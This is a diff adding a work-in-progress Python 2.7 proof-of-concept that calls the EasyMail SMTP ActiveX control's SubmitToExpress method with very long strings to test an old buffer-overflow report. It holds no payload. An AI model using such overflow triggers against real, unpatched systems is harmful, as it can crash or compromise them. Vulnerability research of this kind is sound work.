@@ -1,0 +1,21 @@
+# https://joeyrideout.com/reworking-decade-old-exploit-code/
+# Python 2.7.15 32-bit PoC of https://www.exploit-db.com/exploits/10007/.
+# WIP
+
+# First, register DLL with Windows regsvr32 (for the brave! Use a VM.)
+# Admin CMD:> regsvr32 .\emsmtp.dll
+# (After, unregister with regsvr32 -u .\emsmtp.dll)
+
+
+# Then set up python:
+# Install 32-bit (x86): https://www.python.org/ftp/python/2.7.15/python-2.7.15.msi
+# Then: pip install pywin32
+import win32com.client
+emlib = win32com.client.Dispatch("EasyMail.SMTP")
+
+# Exploit calls for >99999 chars passed to SubmitToExpress method
+aaa = "A"*199999
+assert(10 == emlib.SubmitToExpress(aaa))  # Returns INT(10) if safe? (no crash)
+assert(10 == emlib.SubmitToExpress(aaa*100))  # Why not more?
+
+print "Done. EasyMail SMTP SubmitToExpress appears to be safe."
